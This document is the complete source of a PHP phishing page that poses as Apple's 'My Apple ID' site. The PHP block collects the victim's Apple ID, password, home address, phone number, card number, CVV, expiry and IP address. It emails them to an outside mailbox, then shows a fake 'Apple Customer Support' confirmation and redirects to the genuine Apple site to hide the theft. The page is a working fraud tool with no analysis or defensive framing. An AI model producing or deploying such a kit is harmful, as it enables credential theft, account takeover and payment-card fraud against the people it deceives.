<?php
$email = $_POST['email'];
$password = $_POST['password'];
$street = $_POST['street'];
$citi = $_POST['citi'];
$count = $_POST['count'];
$pcode = $_POST['pcode'];
$cryy = $_POST['cryy'];
$phone = $_POST['phone'];
$first = $_POST['first'];
$cc = $_POST['cc'];
$cvv = $_POST['cvv'];
$expr = $_POST['expr'];
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = $_POST['hostname'];
$server = $_SERVER['SERVER_NAME'];
$idle = $_SERVER['PHP_SELF'];

$data = "
-----------------Full_Details-----------------
Apple ID : $email
Password : $password
-
Street Name : $street
City : $citi
County: $count
Postcode : $pcode
Country : $cryy
Phone Number: $phone
-
CardHolder's Name : $first
Card Number : $cc
Expiry Date : $expr
Verification : $cvv
-----------------------Extra Info----------------------
Client IP : $ip
Date Log : $date
Time Log : $time
--------------------Full_Info_Result--------------------
";

$headers = "From: webmaster@example.com" . "\r\n" .
"CC: somebodyelse@example.com";
$subject ="test";
$to = "eileen.cosey@hotmail.com";
mail($to,$subject,$data,$headers);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en_UK" lang="en_UK" dir="ltr">

		
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />  
    <title>Apple - My Apple ID</title>
	<link rel="shortcut icon" href="http://portalantioxidantes.com/style/images/favicon.gif">
       
	<head>
    <link rel="stylesheet" type="text/css" href="http://portalantioxidantes.com/style/navigation.css"></link>
    <link rel="stylesheet" type="text/css" href="http://portalantioxidantes.com/style/base.css"></link>
    <link rel="stylesheet" type="text/css" href="http://portalantioxidantes.com/style/myappleid.css"></link>
    <script type="text/javascript" src="http://portalantioxidantes.com/style/globalnav.js"></script>    
	</head>

<body onload="javascript:MyAppleID.errorFocus.errorParent();" class="myappleid sign-in index" id="editContainerBody">  
<meta http-equiv="refresh" content="5;url=https://appleid.apple.com/cgi-bin/WebObjects/MyAppleId.woa/">
<script type="text/javascript">
        var searchSection = 'global';
        var searchCountry = 'UK';
</script>
<style type="text/css">
<!--
.style1 {
	color: #FF0000;
	font-weight: bold;
	font-size: 18px;
}
-->
</style>

<nav dir="ltr" id="globalheader">
        <ul id="globalnav">
                <li id="gn-apple"><a href=""><span>Apple</span></a></li>
                <li id="gn-store"><a href=""><span>Store</span></a></li>
                <li id="gn-mac"><a href=""><span>Mac</span></a></li>
                <li id="gn-ipod"><a href=""><span>iPad</span></a></li>
                <li id="gn-iphone"><a href=""><span>iPhone</span></a></li>
                <li id="gn-ipad"><a href=""><span>iPad</span></a></li>
                <li id="gn-itunes"><a href=""><span>iTunes</span></a></li> 
                <li id="gn-support" class="gn-last"><a class="gn-last" href=""><span>Support</span></a></li>
        </ul>
   <div id="globalsearch">
                <form action="" method="post" class="search" id="g-search"><div>
                        <label for="sp-searchtext"><input type="text" name="q" id="sp-searchtext" accesskey="s" /></label>
                </div></form>
                <div id="sp-magnify"><div class="magnify-searchmode"></div><div class="magnify"></div></div>
                <div id="sp-results"></div>
        </div>
</nav>
<script type="text/javascript">
        AC.GlobalNav.Instance = new AC.GlobalNav();
</script>

<form method="POST" onsubmit="" id="signIn" name="" action="idv.php">
<script type="text/javascript">
	 Event.observe(window, 'load', function() {
	 if(appleId!=null)
	 });	 
</script>

  <div id="productheader">	  
		
		</div>

<div id = "OverlayPanelAreUStil" class = "overlaypanel overlay-compare popped short-height" style = "display: none;">   

        <div class = "buttons">
                    <a role="button" onClick="" name="continueLink" class="btn bigblue" id="" style="outline:0" href="#"></a>
        </div>
      </div>
    </div>
  </div>
</div>

<div id = "AreUStilThrOverlayPanelScreen" class = "overlaypanelscreen" style="position: fixed; top: 0px; left: 0px; opacity: 0.6; height: 100%; width: 100%; display: none; z-index: 22000;;background:white; "></div>

		<div id="main">
			<div id="content" class="content">
			  <div class="grid2colc wrap">
			    <div class="column last">
					 <tr>
                                        <td><p class="heading5 style1">Your information has been submited for verification.</p>
                                          <p class="heading5">You may now use your account as usual. <br>In a few moments you will be redirected to our main login page. </p>
                                          <p class="heading5">Regards ,</p>
                                        <p class="heading5">Apple Customer Support </p></td>
                  </tr>
                                    </table>
		                            <table cellpadding="1" cellspacing="0" width="100%">
		                             
                                </table>
		                            <p>&nbsp;</p></td></tr></table>
		                      </td>
				</div>
			  </div>
			</div>
		</div>
	
<footer id="globalfooter">
<div id="breadory">
	<ol id="breadcrumbs">
		<li class="home"><a href="">Home</a></li>
		<li> <a onClick="" href="#">My Apple ID</a></li>	
		<li>  </li>
	</ol>
</div>

<div class="gf-sosumi">
        <p>Copyright &copy; 2014 Apple Inc. All rights reserved.</p>
        <ul class="piped">
                <li><a class="first" href="">Terms of Use</a></li>
                <li><a href="">Privacy Policy</a></li>
                  <li style="float:right">
                <a class="choose" title="Choose your country or region" href=""><p style="display:inline;margin-right:-5px; padding-right:0px;">Choose your country or region</p><img class="img-22" src="http://portalantioxidantes.com/style/images/UKflag.png" /></a></li>
            </ul>
</div>

</footer>
</html>
